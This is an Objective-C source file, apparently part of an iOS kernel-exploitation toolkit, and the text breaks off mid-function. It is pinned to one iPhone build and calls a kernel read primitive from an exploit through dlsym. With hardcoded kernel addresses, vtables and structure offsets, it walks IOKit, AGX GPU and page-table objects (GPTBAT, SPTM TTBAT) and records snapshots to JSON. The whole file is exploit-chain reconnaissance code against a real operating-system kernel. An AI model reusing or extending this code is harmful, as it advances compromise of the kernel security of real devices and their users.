//
//  CNDUatE1ObserveProbe.m
//
//  Physical 23A341 E1 observer.  Kernel memory is read-only.  Derived object
//  addresses require either a symbol anchor or an artifact-pinned kernel-
//  authenticated IOKit lifecycle event plus exact vtable identity.  Any failed
//  predicate stops the main chain and enters the symbol-anchored F1 fallback.
//

#import "CNDUatE1ObserveProbe.h"
#import "../LogTextView.h"

#import <IOKit/IOKitLib.h>
#import <arpa/inet.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/mach_time.h>
#import <netinet/in.h>
#import <objc/runtime.h>
#import <poll.h>
#import <signal.h>
#import <stdbool.h>
#import <stdlib.h>
#import <stdint.h>
#import <string.h>
#import <sys/mman.h>
#import <sys/socket.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <unistd.h>

extern kern_return_t mach_vm_allocate(
    task_t task, mach_vm_address_t *address, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(
    task_t task, mach_vm_address_t address, mach_vm_size_t size);

@protocol CNDUatE1MetalBuffer <NSObject>
- (void *)contents;
@end

@protocol CNDUatE1MetalBlitEncoder <NSObject>
- (void)fillBuffer:(id<CNDUatE1MetalBuffer>)buffer
             range:(NSRange)range
             value:(uint8_t)value;
- (void)endEncoding;
@end

@protocol CNDUatE1MetalCommandBuffer <NSObject>
- (id<CNDUatE1MetalBlitEncoder>)blitCommandEncoder;
- (void)commit;
- (void)waitUntilCompleted;
- (NSUInteger)status;
- (NSError *)error;
@end

@protocol CNDUatE1MetalCommandQueue <NSObject>
- (id<CNDUatE1MetalCommandBuffer>)commandBuffer;
@end

@protocol CNDUatE1MetalDevice <NSObject>
- (id<CNDUatE1MetalCommandQueue>)newCommandQueue;
- (id<CNDUatE1MetalBuffer>)newBufferWithLength:(NSUInteger)length
                                        options:(NSUInteger)options;
@end

typedef id<CNDUatE1MetalDevice> (*CNDUatE1CreateMetalDeviceFn)(void);

#pragma mark - Exact-build pins (iPhone17,2 / 23A341)

static const uint64_t CNDUatE1UnslidTextBase = 0xfffffff007004000ull;
static const uint64_t CNDUatE1UnslidIOUATInit = 0xfffffff0089f36b8ull;
static const uint32_t CNDUatE1Pacibsp = 0xd503237full;

static const uint64_t CNDUatE1Global = 0xfffffff00b3934f8ull;
static const uint64_t CNDUatE1GVirtBase = 0xfffffff007c38c68ull;
static const uint64_t CNDUatE1GPhysSize = 0xfffffff007c69dc8ull;
static const uint64_t CNDUatE1UATRouteFlag = 0xfffffff00b429ae0ull;
static const uint64_t CNDUatE1IOUATMapsReady = 0xfffffff00b2fe410ull;
static const uint64_t CNDUatE1TTBATMapVA = 0xfffffff00b2fe428ull;

static const uint64_t CNDUatE1AGXDeviceUserClientVtable =
    0xfffffff007cd3d78ull;
static const uint64_t CNDUatE1IOMachPortVtable =
    0xfffffff007c79000ull;
static const uint64_t CNDUatE1AcceleratorVtable = 0xfffffff007cda180ull;
static const uint64_t CNDUatE1AGXSharedVtable = 0xfffffff007cdefb8ull;
static const uint64_t CNDUatE1GartVtable = 0xfffffff007cd9148ull;
static const uint64_t CNDUatE1UATMuxVtable = 0xfffffff007cdff80ull;
static const uint64_t CNDUatE1AGXUATVtable = 0xfffffff007ce1458ull;
static const uint64_t CNDUatE1IOUATVtable = 0xfffffff007ca9a20ull;
static const uint64_t CNDUatAGXInternalResourceVtable =
    0xfffffff007cdbfd8ull;
static const uint64_t CNDUatAGXSecureMemoryMapVtable =
    0xfffffff007cdebf8ull;
static const uint64_t CNDUatAGXArmFirmwareASCVtable =
    0xfffffff007cd5360ull;
static const uint64_t CNDUatAGXFirmwareChannelVtable0 =
    0xfffffff007cd0160ull;
static const uint64_t CNDUatAGXFirmwareChannelVtable1 =
    0xfffffff007cd07f8ull;
static const uint64_t CNDUatAGXRTBuddyVtable =
    0xfffffff008174848ull;
static const uint64_t CNDUatAGXRTBuddyFirmwareVtable =
    0xfffffff008176938ull;
static const uint64_t CNDUatAGXRTBuddyCoredumpMapVtable =
    0xfffffff008170e08ull;
static const uint64_t CNDUatAGXOSArrayVtable =
    0xfffffff007c66da0ull;
static const uint64_t CNDUatAGXRTBuddySegmentVtable =
    0xfffffff008172ce8ull;
static const uint64_t CNDUatAGXIOMemoryMapVtable =
    0xfffffff007c70d10ull;
static const kern_return_t CNDUatE1ExpectedNoService =
    (kern_return_t)0xe00002c7u;

enum {
    CNDUatE1GlobalStatus = 0x00,
    CNDUatE1GlobalMode = 0x08,
    CNDUatE1GlobalObject = 0x28,
    CNDUatE1IOMachPortObject = 0x20,
    CNDUatE1ClientProvider = 0xf8,
    CNDUatE1ClientTask = 0x120,
    CNDUatE1TaskGart = 0x58,
    CNDUatE1AcceleratorGart0 = 0x10828,
    CNDUatE1AcceleratorGart1 = 0x10830,
    CNDUatE1GartContextID0 = 0x230,
    CNDUatE1GartContextIDCount = 4,
    CNDUatE1GartResolverDomain1 = 0x338,
    CNDUatE1GartResolverDomain3 = 0x340,
    CNDUatE1GartResolverDomain7 = 0x348,
    CNDUatE1GartBlock = 0x328,
    CNDUatE1BlockAGXUAT = 0x18,
    CNDUatE1AGXUATGPTBAT = 0x20,
    CNDUatE1GPTBATEntries = 256,
    CNDUatE1GPTBATStride = 16,
    CNDUatE1TTBATEntries = 64,
    CNDUatE1TTBATStride = 16,
    CNDUatE1PageSize = 0x4000,
    CNDUatE1IPKObjectOffset = 0x50,
    CNDUatE1MetalDeviceRefOffset = 0x278,
    CNDUatE1MetalAcceleratorPortOffset = 0x280,
    CNDUatE1DeviceRefServiceOffset = 0x10,
    CNDUatE1DeviceRefConnectionOffset = 0x14,
    CNDUatE1MaxPhaseGarts = 10,
    CNDUatAGXDropState = 0x10a18,
    CNDUatAGXDropGPUOffset = 0x540,
    CNDUatAGXDropOwner = 0x17400,
    CNDUatAGXOwnerMap = 0x58,
    CNDUatAGXMapGart = 0x20,
    CNDUatAGXMapGPUBase = 0x28,
    CNDUatAGXAcceleratorBootstrapGart = 0xd0,
    CNDUatAGXAcceleratorFirmwareASC = 0x548,
    CNDUatAGXFirmwareChannel0 = 0x17f0,
    CNDUatAGXChannelRTBuddy = 0x128,
    CNDUatAGXRTBuddyFirmware = 0x21e0,
    CNDUatAGXRTBuddyCoredumpMap = 0xa8,
    CNDUatAGXCoredumpSegments = 0x20,
    CNDUatAGXCoredumpCPUMaps = 0x28,
    CNDUatAGXOSArrayCount = 0x14,
    CNDUatAGXOSArrayCapacity = 0x18,
    CNDUatAGXOSArrayBacking = 0x20,
    CNDUatAGXRTBuddySegmentGPUBase = 0x28,
    CNDUatAGXRTBuddySegmentLength = 0x30,
    CNDUatAGXIOMemoryMapCPUVA = 0x28,
    CNDUatAGXIOMemoryMapLength = 0x30,
    CNDUatAGXRTBuddyMaximumSegments = 8,
    CNDUatAGXRTBuddyMaximumCapacity = 64,
};

static const uint64_t CNDUatAGXFirmwareOutputTableVA =
    UINT64_C(0xfffffc0000056f08);
static const uint64_t CNDUatAGXFirmwareOutputFieldOffset = 0x14;

static const uint64_t CNDUatAGXFirmwareLeafSelfMap =
    UINT64_C(0x0000fc0001fc8000);

static const uint64_t CNDUatE1EntryPaddrMask = 0x000000ffffffc000ull;
static const uint64_t CNDUatE1EntryASIDMask = 0x00ff000000000000ull;
static const uint64_t CNDUatE1EntryAllowedMask =
    0x00ff00ffffffc001ull;
static const uint64_t CNDUatE1TTBATPaddrMask = 0x000003ffffffc000ull;
static const uint64_t CNDUatE1TTBATContextMask = 0x7fff000000000000ull;
static const uint64_t CNDUatE1TTBATAllowedMask =
    0x7fff03ffffffc001ull;
static NSString *const CNDUatE1GartDomainNames[] = {
    @"TA", @"3D", @"CL", @"accelerator-bootstrap",
};
static NSString *const CNDUatE1GartDomainWitnesses[] = {
    @"AGXTACommandDescriptor::prepare call 0x8b3d43c",
    @"AGX3DCommandDescriptor::prepare call 0x8a6f284",
    @"AGXCLCommandDescriptor::prepare call 0x8a98a48",
    @"AGXAccelerator::start register context 0 at 0x8a7f908",
};

#pragma mark - kslop KRW API

typedef bool (*CNDUatE1CheckedReadFn)(uint64_t address, void *buffer,
                                     size_t length);
typedef bool (*CNDUatE1ValidFn)(uint64_t address);
typedef void (*CNDUatE1OffsetsInitFn)(void);
typedef uint64_t (*CNDUatE1TaskSelfFn)(void);
typedef uint64_t (*CNDUatE1PortObjectFn)(uint64_t task, mach_port_t port);

typedef struct {
    CNDUatE1CheckedReadFn checkedRead;
    CNDUatE1ValidFn valid;
    CNDUatE1OffsetsInitFn offsetsInit;
    CNDUatE1TaskSelfFn taskSelf;
    CNDUatE1PortObjectFn portObject;
    uint32_t *ipcPortKobjectOffset;
    uint64_t *kernelBase;
    uint64_t *kernelSlide;
    uint64_t *t1sz;
    uint64_t pointerMask;
    unsigned pointerBits;
} CNDUatE1API;

typedef struct {
    uint64_t words[CNDUatE1GPTBATEntries * 2];
} CNDUatE1Snapshot;

typedef struct {
    uint64_t words[CNDUatE1TTBATEntries * 2];
} CNDUatE1TTBATSnapshot;

typedef struct {
    uint64_t gart;
    uint64_t block;
    uint64_t agxuat;
    uint64_t gptbat;
    uint64_t acceleratorField;
    CNDUatE1Snapshot before;
    CNDUatE1Snapshot after;
} CNDUatE1Path;

typedef struct {
    uint32_t count;
    uint32_t capacity;
    uint64_t rawBacking;
    uint64_t backing;
} CNDUatAGXOSArrayMetadata;

static bool CNDUatE1Resolve(CNDUatE1API *api, NSString **reason)
{
    if (api == NULL) return false;
    memset(api, 0, sizeof(*api));
    api->checkedRead = (CNDUatE1CheckedReadFn)dlsym(
        RTLD_DEFAULT, "kexploit_krw_read_checked");
    api->valid = (CNDUatE1ValidFn)dlsym(RTLD_DEFAULT,
                                        "is_kaddr_valid");
    api->offsetsInit = (CNDUatE1OffsetsInitFn)dlsym(RTLD_DEFAULT,
                                                    "offsets_init");
    api->taskSelf = (CNDUatE1TaskSelfFn)dlsym(RTLD_DEFAULT, "task_self");
    api->portObject = (CNDUatE1PortObjectFn)dlsym(
        RTLD_DEFAULT, "task_get_ipc_port_object");
    api->ipcPortKobjectOffset = (uint32_t *)dlsym(
        RTLD_DEFAULT, "off_ipc_port_ip_kobject");
    api->kernelBase = (uint64_t *)dlsym(RTLD_DEFAULT, "g_kernel_base");
    api->kernelSlide = (uint64_t *)dlsym(RTLD_DEFAULT, "g_kernel_slide");
    api->t1sz = (uint64_t *)dlsym(RTLD_DEFAULT, "t1sz_boot");

    bool complete = api->checkedRead != NULL && api->valid != NULL &&
        api->offsetsInit != NULL &&
        api->taskSelf != NULL &&
        api->portObject != NULL && api->ipcPortKobjectOffset != NULL &&
        api->kernelBase != NULL && api->kernelSlide != NULL &&
        api->t1sz != NULL;
    if (!complete) {
        if (reason != NULL) *reason = @"kslop-krw-api-incomplete";
        return false;
    }
    // `t1sz_boot` and the structure offsets are populated by offsets_init().
    // Working tweak entry points run that initializer before consuming either;
    // doing the validation first turns a valid live generation into a false
    // `invalid-t1sz` refusal without ever reaching KRW.
    api->offsetsInit();
    uint64_t t1sz = *api->t1sz;
    if (t1sz == 0 || t1sz >= 64) {
        if (reason != NULL) *reason = @"invalid-t1sz";
        return false;
    }
    unsigned bits = (unsigned)(64 - t1sz);
    if (bits == 0 || bits >= 64) {
        if (reason != NULL) *reason = @"invalid-pointer-width";
        return false;
    }
    api->pointerBits = bits;
    api->pointerMask = (UINT64_C(1) << bits) - 1;
    return true;
}

static uint64_t CNDUatE1CanonicalPointer(const CNDUatE1API *api,
                                          uint64_t stored)
{
    if (api == NULL || api->valid == NULL || stored == 0 ||
        api->pointerBits == 0 || api->pointerBits >= 64) return 0;
    uint64_t value = stored & api->pointerMask;
    uint64_t sign = UINT64_C(1) << (api->pointerBits - 1);
    if ((value & sign) != 0) value |= ~api->pointerMask;
    return api->valid(value) ? value : 0;
}

static bool CNDUatE1Read(const CNDUatE1API *api, uint64_t address,
                         void *buffer, size_t length)
{
    if (api == NULL || api->checkedRead == NULL || address == 0 ||
        buffer == NULL || length == 0) return false;
    return api->checkedRead(address, buffer, length);
}

static bool CNDUatE1Read64(const CNDUatE1API *api, uint64_t address,
                           uint64_t *value)
{
    if (value == NULL) return false;
    *value = 0;
    return CNDUatE1Read(api, address, value, sizeof(*value));
}

static bool CNDUatE1Read32(const CNDUatE1API *api, uint64_t address,
                           uint32_t *value)
{
    if (value == NULL) return false;
    *value = 0;
    return CNDUatE1Read(api, address, value, sizeof(*value));
}

static bool CNDUatE1Read8(const CNDUatE1API *api, uint64_t address,
                          uint8_t *value)
{
    if (value == NULL) return false;
    *value = 0;
    return CNDUatE1Read(api, address, value, sizeof(*value));
}

#pragma mark - report and progress

static NSString *CNDUatE1Hex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
            (unsigned long long)value];
}

static BOOL CNDUatE1IsE2Report(NSDictionary<NSString *, id> *report)
{
    return [report[@"schema"] isEqual:
        @"com.zeroxjf.cyanide.uat-e2-retire"];
}

static BOOL CNDUatE1IsAGXBootstrapRootReport(
    NSDictionary<NSString *, id> *report)
{
    return [report[@"schema"] isEqual:
        @"com.zeroxjf.cyanide.uat-agx-bootstrap-root"];
}

static BOOL CNDUatE1IsAGXRTBuddyAliasReport(
    NSDictionary<NSString *, id> *report)
{
    return [report[@"schema"] isEqual:
        @"com.zeroxjf.cyanide.uat-agx-rtbuddy-alias"];
}

static BOOL CNDUatE1IsAGXReport(NSDictionary<NSString *, id> *report)
{
    return CNDUatE1IsAGXBootstrapRootReport(report) ||
        CNDUatE1IsAGXRTBuddyAliasReport(report);
}

static BOOL CNDUatE1IsE4Report(NSDictionary<NSString *, id> *report)
{
    return [report[@"schema"] isEqual:
        @"com.zeroxjf.cyanide.uat-e4-inflight"];
}

static BOOL CNDUatE1IsE5Report(NSDictionary<NSString *, id> *report)
{
    return [report[@"schema"] isEqual:
        @"com.zeroxjf.cyanide.uat-e5-owner-release"];
}

static BOOL CNDUatE1IsE5DeviceReport(NSDictionary<NSString *, id> *report)
{
    return [report[@"schema"] isEqual:
        @"com.zeroxjf.cyanide.uat-e5-device-release"];
}

static BOOL CNDUatE1IsE5ConnectionReport(
    NSDictionary<NSString *, id> *report)
{
    return [report[@"schema"] isEqual:
        @"com.zeroxjf.cyanide.uat-e5-connection-release"];
}

static BOOL CNDUatE1IsE5RawQueueReport(
    NSDictionary<NSString *, id> *report)
{
    return [report[@"schema"] isEqual:
        @"com.zeroxjf.cyanide.uat-e5-raw-queue-release"];
}

static BOOL CNDUatE1IsE5RawQueueBindReport(
    NSDictionary<NSString *, id> *report)
{
    return [report[@"schema"] isEqual:
        @"com.zeroxjf.cyanide.uat-e5-raw-queue-bind-release"];
}

static NSString *CNDUatE1ReportPath(
    NSDictionary<NSString *, id> *report)
{
    NSString *dir = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    if (dir == nil) return nil;
    NSString *name = CNDUatE1IsAGXRTBuddyAliasReport(report)
        ? @"CNDUatAGXRTBuddyAlias.json"
        : (CNDUatE1IsAGXBootstrapRootReport(report)
        ? @"CNDUatAGXBootstrapRoot.json"
        : (CNDUatE1IsE5RawQueueBindReport(report)
        ? @"CNDUatE5RawQueueBindRelease.json"
        : (CNDUatE1IsE5RawQueueReport(report)
        ? @"CNDUatE5RawQueueRelease.json"
        : (CNDUatE1IsE5ConnectionReport(report)
        ? @"CNDUatE5ConnectionRelease.json"
        : (CNDUatE1IsE5DeviceReport(report)
        ? @"CNDUatE5DeviceRelease.json"
        : (CNDUatE1IsE5Report(report)
        ? @"CNDUatE5OwnerRelease.json"
        : (CNDUatE1IsE4Report(report)
        ? @"CNDUatE4Inflight.json"
        : (CNDUatE1IsE2Report(report)
            ? @"CNDUatE2Retire.json" : @"CNDUatE1Observe.json"))))))));
    return [dir stringByAppendingPathComponent:name];
}

static void CNDUatE1Persist(NSMutableDictionary<NSString *, id> *report)
{
    if (report == nil) return;
    report[@"updatedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSString *path = CNDUatE1ReportPath(report);
    if (path != nil) report[@"reportPath"] = path;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys error:nil];
    if (path != nil && data != nil) {
        (void)[data writeToFile:path options:NSDataWritingAtomic error:nil];
    }
}

static void CNDUatE1Progress(NSMutableDictionary<NSString *, id> *report,
                             NSString *hop, NSString *stage,
                             uint64_t address)
{
    NSMutableArray *events = [report[@"progress"] mutableCopy] ?:
        [NSMutableArray array];
    NSMutableDictionary *event = [@{
        @"hop": hop ?: @"unknown",
        @"stage": stage ?: @"unknown",
        @"at": @([[NSDate date] timeIntervalSince1970]),
    } mutableCopy];
    if (address != 0) event[@"address"] = CNDUatE1Hex(address);
    [events addObject:event];
    report[@"progress"] = events;
    report[@"currentHop"] = hop ?: @"unknown";
    report[@"currentStage"] = stage ?: @"unknown";
    if (address != 0) report[@"nextReadAddress"] = CNDUatE1Hex(address);
    else [report removeObjectForKey:@"nextReadAddress"];
    CNDUatE1Persist(report);
    const char *prefix = CNDUatE1IsAGXReport(report)
        ? "AGX_SPTM" : (CNDUatE1IsE2Report(report) ? "UAT_E2" : "UAT_E1");
    log_user("[%s] hop=%s stage=%s address=0x%016llx\n", prefix,
             hop.UTF8String ?: "unknown", stage.UTF8String ?: "unknown",
             (unsigned long long)address);
}

static void CNDUatE1Finish(NSMutableDictionary<NSString *, id> *report,
                           NSString *result,
                           void (^completion)(NSDictionary<NSString *, id> *))
{
    report[@"result"] = result ?: @"unknown";
    report[@"state"] = @"finished";
    CNDUatE1Progress(report, @"finish", result ?: @"unknown", 0);
    const char *prefix = CNDUatE1IsAGXReport(report)
        ? "AGX_SPTM" : (CNDUatE1IsE2Report(report) ? "UAT_E2" : "UAT_E1");
    log_user("[%s] finished result=%s main=%s fallback=%s diffs=%s\n",
             prefix,
             [report[@"result"] UTF8String] ?: "unknown",
             [report[@"mainChainResult"] UTF8String] ?: "none",
             [report[@"fallbackResult"] UTF8String] ?: "none",
             [[report[@"changedEntryCount"] description] UTF8String] ?: "0");
    if (completion != nil) completion([report copy]);
}

static NSString *CNDUatE1SysctlString(const char *name)
{
    size_t length = 0;
    if (sysctlbyname(name, NULL, &length, NULL, 0) != 0 || length == 0) {
        return @"";
    }
    char *buffer = calloc(1, length);
    if (buffer == NULL) return @"";
    if (sysctlbyname(name, buffer, &length, NULL, 0) != 0) {
        free(buffer);
        return @"";
    }
    NSString *value = [NSString stringWithUTF8String:buffer] ?: @"";
    free(buffer);
    return value;
}

#pragma mark - predicates

static bool CNDUatE1ValidateLifecycleVptr(
    NSMutableDictionary<NSString *, id> *report,
    const CNDUatE1API *api, NSString *hop, uint64_t object,
    uint64_t expectedUnslidVtable, uint64_t slide,
    NSString *kernelAuthSite,
    NSMutableDictionary<NSString *, id> **predicateOut)
{
    uint64_t vptrAddress = object;
    CNDUatE1Progress(report, hop, @"vptr-read", vptrAddress);
    uint64_t raw = 0;
    if (!CNDUatE1Read64(api, vptrAddress, &raw)) return false;
    uint64_t stripped = CNDUatE1CanonicalPointer(api, raw);
    uint64_t expected = expectedUnslidVtable + slide;
    bool stripMatches = stripped == expected;
    NSMutableDictionary *predicate = [@{
        @"hop": hop ?: @"unknown",
        @"object": CNDUatE1Hex(object),
        @"rawVptr": CNDUatE1Hex(raw),
        @"strippedVptr": CNDUatE1Hex(stripped),
        @"expectedVptr": CNDUatE1Hex(expected),
        @"validationModel": @"kernel-authenticated-lifecycle-plus-exact-vtable",
        @"kernelAuthSite": kernelAuthSite ?: @"unspecified",
        @"kernelPACKeyContext": @"kernel",
        @"el0PACReauthenticationAttempted": @NO,
        @"stripMatches": @(stripMatches),
        @"passed": @(stripMatches),
    } mutableCopy];
    NSMutableArray *predicates = [report[@"predicates"] mutableCopy] ?:
        [NSMutableArray array];
    [predicates addObject:predicate];
    report[@"predicates"] = predicates;
    if (predicateOut != NULL) *predicateOut = predicate;
    CNDUatE1Persist(report);
    const char *prefix = CNDUatE1IsAGXReport(report)
        ? "AGX_SPTM" : "UAT_E1";
    log_user("[%s] hop=%s vptr raw=0x%016llx stripped=0x%016llx "
             "expected=0x%016llx lifecycle=%s\n",
             prefix, hop.UTF8String ?: "unknown", (unsigned long long)raw,
             (unsigned long long)stripped, (unsigned long long)expected,
             stripMatches ? "match" : "mismatch");
    return stripMatches;
}

static bool CNDUatE1ValidateLifecycleVptrEither(
    NSMutableDictionary<NSString *, id> *report,
    const CNDUatE1API *api, NSString *hop, uint64_t object,
    uint64_t expectedUnslidVtable0, uint64_t expectedUnslidVtable1,
    uint64_t slide, NSString *kernelAuthSite)
{
    uint64_t vptrAddress = object;
    CNDUatE1Progress(report, hop, @"vptr-read-two-class-gate", vptrAddress);
    uint64_t raw = 0;
    if (!CNDUatE1Read64(api, vptrAddress, &raw)) return false;
    uint64_t stripped = CNDUatE1CanonicalPointer(api, raw);
    uint64_t expected0 = expectedUnslidVtable0 + slide;
    uint64_t expected1 = expectedUnslidVtable1 + slide;
    bool stripMatches = stripped == expected0 || stripped == expected1;
    NSMutableDictionary *predicate = [@{
        @"hop": hop ?: @"unknown",
        @"object": CNDUatE1Hex(object),
        @"rawVptr": CNDUatE1Hex(raw),
        @"strippedVptr": CNDUatE1Hex(stripped),
        @"expectedVptr0": CNDUatE1Hex(expected0),
        @"expectedVptr1": CNDUatE1Hex(expected1),
        @"validationModel":
            @"kernel-authenticated-lifecycle-plus-one-of-two-exact-vtables",
        @"kernelAuthSite": kernelAuthSite ?: @"unspecified",
        @"kernelPACKeyContext": @"kernel",
        @"el0PACReauthenticationAttempted": @NO,
        @"stripMatches": @(stripMatches),
        @"passed": @(stripMatches),
    } mutableCopy];
    NSMutableArray *predicates = [report[@"predicates"] mutableCopy] ?:
        [NSMutableArray array];
    [predicates addObject:predicate];
    report[@"predicates"] = predicates;
    CNDUatE1Persist(report);
    log_user("[AGX_SPTM] hop=%s vptr raw=0x%016llx stripped=0x%016llx "
             "expected0=0x%016llx expected1=0x%016llx lifecycle=%s\n",
             hop.UTF8String ?: "unknown", (unsigned long long)raw,
             (unsigned long long)stripped, (unsigned long long)expected0,
             (unsigned long long)expected1,
             stripMatches ? "match" : "mismatch");
    return stripMatches;
}

static NSDictionary<NSString *, id> *CNDUatE1PointerReport(
    const CNDUatE1API *api, uint64_t raw)
{
    uint64_t canonical = CNDUatE1CanonicalPointer(api, raw);
    return @{
        @"raw": CNDUatE1Hex(raw),
        @"canonical": CNDUatE1Hex(canonical),
        @"syntacticallyValid": @(canonical != 0),
        @"mappednessClaimed": @NO,
    };
}

static bool CNDUatE1ValidateGPTBAT(NSMutableDictionary<NSString *, id> *report,
                                   const CNDUatE1API *api, uint64_t raw,
                                   uint64_t gVirtBase, uint64_t gPhysSize,
                                   uint64_t *gptbatOut)
{
    uint64_t gptbat = CNDUatE1CanonicalPointer(api, raw);
    bool aligned = gptbat != 0 && (gptbat & (CNDUatE1PageSize - 1)) == 0;
    bool rangeSane = gVirtBase != 0 &&
        gPhysSize >= CNDUatE1PageSize &&
        gPhysSize <= UINT64_C(0x400000000);
    bool inRange = rangeSane && gptbat >= gVirtBase &&
        gptbat - gVirtBase <= gPhysSize - CNDUatE1PageSize;
    report[@"gptbatPredicate"] = @{
        @"raw": CNDUatE1Hex(raw),
        @"canonical": CNDUatE1Hex(gptbat),
        @"gVirtBase": CNDUatE1Hex(gVirtBase),
        @"gPhysSize": CNDUatE1Hex(gPhysSize),
        @"aligned16K": @(aligned),
        @"physmapRangeSane": @(rangeSane),
        @"inPhysmapRange": @(inRange),
        @"passed": @(aligned && inRange),
    };
    CNDUatE1Persist(report);
    if (gptbatOut != NULL) *gptbatOut = aligned && inRange ? gptbat : 0;
    return aligned && inRange;
}

#pragma mark - snapshot and diff

static NSDictionary<NSString *, id> *CNDUatE1DecodedWord(
    uint64_t word, NSUInteger index, NSUInteger root)
{
    uint64_t asid = (word & CNDUatE1EntryASIDMask) >> 48;
    return @{
        @"index": @(index),
        @"root": @(root),
        @"word": CNDUatE1Hex(word),
        @"asid": @(asid),
        @"paddr": CNDUatE1Hex(word & CNDUatE1EntryPaddrMask),
        @"valid": @((word & 1) != 0),
        @"shapeValid": @((word & ~CNDUatE1EntryAllowedMask) == 0 &&
                           asid == index),
    };
}

static bool CNDUatE1SnapshotTable(
    NSMutableDictionary<NSString *, id> *report,
    const CNDUatE1API *api, NSString *label, uint64_t gptbat,
    CNDUatE1Snapshot *snapshot, NSDictionary<NSString *, id> **summaryOut)
{
    if (snapshot == NULL) return false;
    memset(snapshot, 0, sizeof(*snapshot));
    CNDUatE1Progress(report, label, @"snapshot-4096-byte-read", gptbat);
    if (!CNDUatE1Read(api, gptbat, snapshot, sizeof(*snapshot))) return false;

    NSMutableArray *valid = [NSMutableArray array];
    NSMutableArray *bad = [NSMutableArray array];
    for (NSUInteger index = 0; index < CNDUatE1GPTBATEntries; index++) {
        for (NSUInteger root = 0; root < 2; root++) {
            uint64_t word = snapshot->words[index * 2 + root];
            if ((word & 1) == 0) continue;
            NSDictionary *decoded = CNDUatE1DecodedWord(word, index, root);
            [valid addObject:decoded];
            if (![decoded[@"shapeValid"] boolValue]) [bad addObject:decoded];
        }
    }
    NSDictionary *summary = @{
        @"label": label ?: @"snapshot",
        @"gptbat": CNDUatE1Hex(gptbat),
        @"bytesRead": @(sizeof(*snapshot)),
        @"krwReadCalls": @1,
        @"validWords": valid,
        @"validWordCount": @(valid.count),
        @"invalidShapeWords": bad,
        @"shapePassed": @(bad.count == 0),
    };
    if (summaryOut != NULL) *summaryOut = summary;
    log_user("[UAT_E1] %s gptbat=0x%016llx validWords=%lu shape=%s\n",
             label.UTF8String ?: "snapshot", (unsigned long long)gptbat,
             (unsigned long)valid.count, bad.count == 0 ? "pass" : "fail");
    return bad.count == 0;
}

static NSArray<NSDictionary<NSString *, id> *> *CNDUatE1Diff(
    const CNDUatE1Snapshot *before, const CNDUatE1Snapshot *after,
    uint64_t gptbat)
{
    NSMutableArray *changes = [NSMutableArray array];
    if (before == NULL || after == NULL) return changes;
    for (NSUInteger index = 0; index < CNDUatE1GPTBATEntries; index++) {
        uint64_t b0 = before->words[index * 2];
        uint64_t b1 = before->words[index * 2 + 1];
        uint64_t a0 = after->words[index * 2];
        uint64_t a1 = after->words[index * 2 + 1];
        if (b0 == a0 && b1 == a1) continue;
        [changes addObject:@{
            @"gptbat": CNDUatE1Hex(gptbat),
            @"index": @(index),
            @"beforeWord0": CNDUatE1DecodedWord(b0, index, 0),
            @"beforeWord1": CNDUatE1DecodedWord(b1, index, 1),
            @"afterWord0": CNDUatE1DecodedWord(a0, index, 0),
            @"afterWord1": CNDUatE1DecodedWord(a1, index, 1),
            @"clearedOnClose": @(((b0 & 1) != 0 || (b1 & 1) != 0) &&
                                  (a0 & 1) == 0 && (a1 & 1) == 0),
        }];
    }
    return changes;
}

#pragma mark - route-1 SPTM TTBAT observer

typedef NS_ENUM(NSInteger, CNDUatE1TTBATRunResult) {
    CNDUatE1TTBATRunAborted = -1,
    CNDUatE1TTBATRunObservedNoDiff = 0,
    CNDUatE1TTBATRunObservedDiff = 1,
};

typedef struct {
    uint64_t address;
    NSUInteger anchorIndex;
    NSUInteger resolverSelector;
    bool perTask;
    bool derivedDomain;
    bool metalAction;
} CNDUatE1ValidatedGart;

static bool CNDUatE1ResolveConnectionGarts(
    NSMutableDictionary<NSString *, id> *report,
    const CNDUatE1API *api, uint64_t slide, uint64_t selfTask,
    io_connect_t connection, NSString *phase,
    CNDUatE1ValidatedGart *garts, NSUInteger capacity,
    NSUInteger *gartCount, NSString **reasonOut)
{
    NSString *phaseName = phase ?: @"unknown";
    NSString *reportKey = [NSString stringWithFormat:
        @"%@MetalConnectionAnchor", phaseName];
    NSMutableDictionary<NSString *, id> *anchor = [@{
        @"phase": phaseName,
        @"source": @"IOGPUMetalDevice._deviceRef +0x278 -> connection +0x14",
        @"connection": CNDUatE1Hex((uint32_t)connection),
        @"staticWitness":
            @"23A341 IOGPUMetalDevice metadata; _IOGPUDeviceCreateWithOptions "
             "stores service/connection at deviceRef+0x10/+0x14; "
             "e1_metal_accelerator_port_audit.py",
    } mutableCopy];
    report[reportKey] = anchor;
    CNDUatE1Persist(report);

    if (garts == NULL || gartCount == NULL || *gartCount >= capacity) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-gart-capacity-failed", phaseName];
        return false;
    }

    NSString *hop = [NSString stringWithFormat:
        @"route1.metal-connection.%@", phaseName];
    CNDUatE1Progress(report, hop, @"resolve-metal-ipc-port", 0);
    uint64_t portObjectBefore = api->portObject(selfTask, connection);
    uint64_t canonicalPortObject =
        CNDUatE1CanonicalPointer(api, portObjectBefore);
    bool portObjectPassed = portObjectBefore != 0 &&
        canonicalPortObject == portObjectBefore &&
        (portObjectBefore & 0x7) == 0;
    anchor[@"ipcPortObject"] = CNDUatE1Hex(portObjectBefore);
    anchor[@"ipcPortCanonical"] = CNDUatE1Hex(canonicalPortObject);
    anchor[@"ipcPortAligned8"] = @((portObjectBefore & 0x7) == 0);
    anchor[@"ipcPortPredicatePassed"] = @(portObjectPassed);
    CNDUatE1Persist(report);
    if (!portObjectPassed) {
        if (reasonOut != NULL) *reasonOut = [NSString stringWithFormat:
            @"metal-connection-%@-ipc-port-resolution-failed", phaseName];
        return false;
    }

    uint64_t ipKobjectAddress = portObjectBefore + CNDUatE1IPKObjectOffset;
    CNDUatE1Progress(report, hop, @"read-raw-ip-kobject-before",
                     ipKobjectAddress);
    uint64_t clientRawBefore = 0;
    if (!CNDUatE1Read64(api, ipKobjectAddress, &clientRawBefore) ||
        clientRawBefore == 0) {
